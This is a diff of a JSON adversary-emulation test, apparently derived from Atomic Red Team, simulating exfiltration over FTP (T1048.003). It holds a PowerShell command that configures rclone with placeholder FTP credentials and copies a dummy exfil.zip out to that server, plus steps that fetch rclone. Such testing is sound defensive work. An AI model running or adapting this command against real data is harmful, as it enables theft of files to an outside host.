@@ -7,16 +7,16 @@
   ],
   "steps": [
     {
-      "id": "83fd76a4-976a-4982-8201-f7037a0b992e",
+      "id": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655",
       "type": "execute-command",
       "data": {
         "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n\u0026$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n\u0026$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "4ae68ba3-e731-433a-85fa-ee78aca54d70",
+      "id": "a0199bef-1c04-4aea-85ea-61d4cb105a22",
       "name": "Check dependency 1/2",
       "description": "Check if the exfil package exists\n",
       "type": "execute-command",
@@ -24,10 +24,10 @@
         "command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "3818f381-5b06-44fc-9f06-ef384ff22809",
+      "id": "c9d925fd-be35-4d21-b4eb-3bb2aa0ac57c",
       "name": "Resolve dependency 1/2",
       "description": "Check if the exfil package exists\n",
       "type": "execute-command",
@@ -35,10 +35,10 @@
         "command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "bd2fdc28-a8c2-45d1-a17d-41ea01b1b780",
+      "id": "febb42b6-3549-4903-89d0-80e78b50361a",
       "name": "Re-check dependency 1/2",
       "description": "Check if the exfil package exists\n",
       "type": "execute-command",
@@ -46,10 +46,10 @@
         "command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "c7f592a9-fa82-44d2-8c80-08c364052cfe",
+      "id": "9b36c640-c0e2-49c8-9a69-6587708e8391",
       "name": "Check dependency 2/2",
       "description": "Check if rclone zip exists",
       "type": "execute-command",
@@ -57,10 +57,10 @@
         "command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "345eb1d1-1301-46e4-964b-3b80c1e7481c",
+      "id": "41d2e9bb-219f-4fea-883c-9a86a5f647a1",
       "name": "Resolve dependency 2/2",
       "description": "Check if rclone zip exists",
       "type": "execute-command",
@@ -68,10 +68,10 @@
         "command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "d7119d4d-fafb-4ccc-910a-5537f9e93ab6",
+      "id": "c89187c1-ecb7-4258-9c8d-32ac73e9f93b",
       "name": "Re-check dependency 2/2",
       "description": "Check if rclone zip exists",
       "type": "execute-command",
@@ -79,54 +79,54 @@
         "command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "4ae68ba3-e731-433a-85fa-ee78aca54d70",
+      "s": "a0199bef-1c04-4aea-85ea-61d4cb105a22",
       "p": "on-success",
-      "o": "83fd76a4-976a-4982-8201-f7037a0b992e"
+      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
     },
     {
-      "s": "4ae68ba3-e731-433a-85fa-ee78aca54d70",
+      "s": "a0199bef-1c04-4aea-85ea-61d4cb105a22",
       "p": "on-failure",
-      "o": "3818f381-5b06-44fc-9f06-ef384ff22809"
+      "o": "c9d925fd-be35-4d21-b4eb-3bb2aa0ac57c"
     },
     {
-      "s": "3818f381-5b06-44fc-9f06-ef384ff22809",
+      "s": "c9d925fd-be35-4d21-b4eb-3bb2aa0ac57c",
       "p": "on-success",
-      "o": "bd2fdc28-a8c2-45d1-a17d-41ea01b1b780"
+      "o": "febb42b6-3549-4903-89d0-80e78b50361a"
     },
     {
-      "s": "bd2fdc28-a8c2-45d1-a17d-41ea01b1b780",
+      "s": "febb42b6-3549-4903-89d0-80e78b50361a",
       "p": "on-failure",
-      "o": "83fd76a4-976a-4982-8201-f7037a0b992e"
+      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
     },
     {
-      "s": "c7f592a9-fa82-44d2-8c80-08c364052cfe",
+      "s": "9b36c640-c0e2-49c8-9a69-6587708e8391",
       "p": "on-success",
-      "o": "83fd76a4-976a-4982-8201-f7037a0b992e"
+      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
     },
     {
-      "s": "c7f592a9-fa82-44d2-8c80-08c364052cfe",
+      "s": "9b36c640-c0e2-49c8-9a69-6587708e8391",
       "p": "on-failure",
-      "o": "345eb1d1-1301-46e4-964b-3b80c1e7481c"
+      "o": "41d2e9bb-219f-4fea-883c-9a86a5f647a1"
     },
     {
-      "s": "345eb1d1-1301-46e4-964b-3b80c1e7481c",
+      "s": "41d2e9bb-219f-4fea-883c-9a86a5f647a1",
       "p": "on-success",
-      "o": "d7119d4d-fafb-4ccc-910a-5537f9e93ab6"
+      "o": "c89187c1-ecb7-4258-9c8d-32ac73e9f93b"
     },
     {
-      "s": "d7119d4d-fafb-4ccc-910a-5537f9e93ab6",
+      "s": "c89187c1-ecb7-4258-9c8d-32ac73e9f93b",
       "p": "on-failure",
-      "o": "83fd76a4-976a-4982-8201-f7037a0b992e"
+      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
     }
   ],
   "tags": [
-    "T1048.003",
-    "atomic-red-team"
+    "T1048",
+    "T1048.003"
   ],
   "input_arguments": [
     {
